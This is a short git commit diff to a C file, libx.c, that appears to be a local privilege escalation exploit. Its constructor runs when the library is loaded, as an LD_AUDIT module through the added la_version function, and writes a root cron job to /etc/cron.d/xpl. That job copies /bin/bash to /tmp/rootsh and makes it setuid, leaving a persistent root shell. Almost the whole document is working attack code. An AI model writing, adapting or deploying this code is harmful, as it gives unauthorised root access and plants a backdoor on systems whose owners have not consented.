bb871a51a733c64a637d5af0eb6eeae7ca015e3c
Unknown1337 <88354254+PsychoH4x0r@users.noreply.github.com>
2025-07-28 18:49:33 +0700

    Update libx.c

--- libx.c
+++ libx.c
@@ -1,8 +1,14 @@
+#define _GNU_SOURCE
+#include <link.h>
 #include <stdio.h>
-#include <stdlib.h>
 #include <unistd.h>
+#include <stdlib.h>
 
-__attribute__((constructor)) void init() {
+unsigned int la_version(unsigned int version) {
+    return LAV_CURRENT;
+}
+
+void __attribute__((constructor)) init() {
     FILE *f = fopen("/etc/cron.d/xpl", "w");
     if (f) {
         fprintf(f, "* * * * * root cp /bin/bash /tmp/rootsh; chmod +s /tmp/rootsh\n");
